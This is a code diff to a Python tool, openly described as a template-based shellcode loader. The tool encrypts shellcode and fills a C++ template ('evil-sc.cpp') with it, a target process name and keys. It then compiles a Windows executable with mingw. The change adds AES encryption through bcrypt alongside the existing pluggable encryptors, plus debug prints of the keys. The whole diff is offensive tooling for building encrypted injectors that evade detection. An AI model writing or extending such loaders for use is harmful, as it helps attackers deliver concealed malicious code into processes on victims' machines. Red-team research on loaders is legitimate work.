@@ -6,9 +6,7 @@ from colorama import init, Fore
 from core.utils.scUtils import *
 from core.utils.CustomArgFormatter import CustomArgFormatter
 from core.utils.cVariableUtils import *
-import importlib
-import re
-
+from core.templates.encryptors.aes.aes import Aes
 
 def banner():
     init(autoreset=True)
@@ -41,6 +39,9 @@ class esc:
         self.evil_sc_template_file = ""
         self.outfile = ""
         self.final_shellcode = ""
+        self.compile_options = ""
+
+
 
     def parse_arguments(self):
         parser = argparse.ArgumentParser(description='Template-based shellcode loader', formatter_class=CustomArgFormatter)
@@ -112,7 +113,7 @@ class esc:
         methods_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', folder)
         if not os.path.exists(methods_folder):
             os.makedirs(methods_folder)
-        available_methods = [folder for folder in os.listdir(methods_folder) if os.path.isdir(os.path.join(methods_folder, folder))]
+        available_methods = [folder for folder in os.listdir(methods_folder) if os.path.isdir(os.path.join(methods_folder, folder)) and folder != "__pycache__"]
         return available_methods
 
     def process_method_folder(self, method_folder):
@@ -149,7 +150,8 @@ class esc:
 
     def generate_evil_sc_file(self):
         template_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', 'loaderTemplate', 'template.cpp')
-        
+        is_shellcode_defined = False
+
         with open(template_path, "r") as template_file:
             template_content = template_file.read()
 
@@ -175,24 +177,54 @@ class esc:
 
         # Import encryptors functions and encrypt/Create the shellcode
         temp_shellcode = file_to_cpp_sc(self.shellcode_variable)
+        encoder_includes = ""
         if self.encrypt_folders:
             temp_enc_shellcode = file_to_bytearray(self.shellcode_variable)
             for i in range(0,len(self.encrypt_folders)):
                 ## Working for XOR
                 encryptor = self.encrypt_folders[i]
-                encryptor_key = self.encrypt_keys[i]
-                encryptor_module_str = f"core.templates.encryptors.{encryptor}.{encryptor}"
-                encryptor_module = __import__(encryptor_module_str, fromlist=[encryptor])
-                encryptor_func = getattr(encryptor_module,encryptor)
-                temp_enc_shellcode = encryptor_func(temp_enc_shellcode,encryptor_key)
-                evil_sc_content = evil_sc_content.replace("###ENC_KEY###",encryptor_key,1)
-            temp_shellcode = bytearray_to_cpp_sc(temp_enc_shellcode)
+                if encryptor == "aes":
+                    ### Add some headers for AES ###
+                    encoder_includes = "#include <bcrypt.h>\n#pragma comment(lib, \"bcrypt.lib\")\n#include <ntstatus.h>"
+                    self.compile_options += " -lbcrypt "
+                    
+                    ### Generate Keys and encrypt###
+                    aes_encryptor = Aes()
+                    temp_enc_shellcode = aes_encryptor.encrypt(temp_enc_shellcode)
+
+                    
+                    ## Replaces placeholders
+                    evil_sc_content = evil_sc_content.replace("###AES_KEY###", aes_encryptor.c_key())
+                    evil_sc_content = evil_sc_content.replace("###AES_IV###", aes_encryptor.c_iv())
+                    
+                    if not is_shellcode_defined:
+                        temp_shellcode = bytearray_to_cpp_sc(temp_enc_shellcode,method=1)
+                        is_shellcode_defined = True
+
+                    ### DEBUG SECTION ###
+                    temp_enc_decoded = aes_encryptor.decrypt(temp_enc_shellcode)
+                    print(f"DEBUG, Encoded: {bytearray_to_cpp_sc(temp_enc_shellcode)}")
+                    print(f"DEBUG, Decoded: {bytearray_to_cpp_sc(temp_enc_decoded,method=1)}")
+                    print(f"DEBUG, AES-KEY: {aes_encryptor.c_key()}")
+                    print(f"DEBUG, AES-IV: {aes_encryptor.c_iv()}")
+                    pass
+                else:
+                    encryptor_key = self.encrypt_keys[i]
+                    encryptor_module_str = f"core.templates.encryptors.{encryptor}.{encryptor}"
+                    encryptor_module = __import__(encryptor_module_str, fromlist=[encryptor])
+                    encryptor_func = getattr(encryptor_module,encryptor)
+                    temp_enc_shellcode = encryptor_func(temp_enc_shellcode,encryptor_key)
+                    evil_sc_content = evil_sc_content.replace("###ENC_KEY###",encryptor_key,1)
+                    if not is_shellcode_defined:
+                        temp_shellcode = bytearray_to_cpp_sc(temp_enc_shellcode)
+                        is_shellcode_defined = True
             
         final_shellcode = temp_shellcode
 
         # REPLACE Others
         evil_sc_content = evil_sc_content.replace("###TARGET_PROCESS###", self.target_process)
         evil_sc_content = evil_sc_content.replace("###SHELLCODE###",final_shellcode )
+        evil_sc_content = evil_sc_content.replace("###ENCODER_INCLUDES###",encoder_includes )
         
 
         self.evil_sc_template_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', 'loaderTemplate', 'evil-sc.cpp')
@@ -201,7 +233,7 @@ class esc:
     
 
     def build_evil_sc_loader(self):
-        os.system(f"x86_64-w64-mingw32-g++ {self.evil_sc_template_file} -o {self.outfile}" )
+        os.system(f"x86_64-w64-mingw32-g++ {self.evil_sc_template_file} -o {self.outfile}{self.compile_options}")
 
     def run(self):
         args = self.parse_arguments()
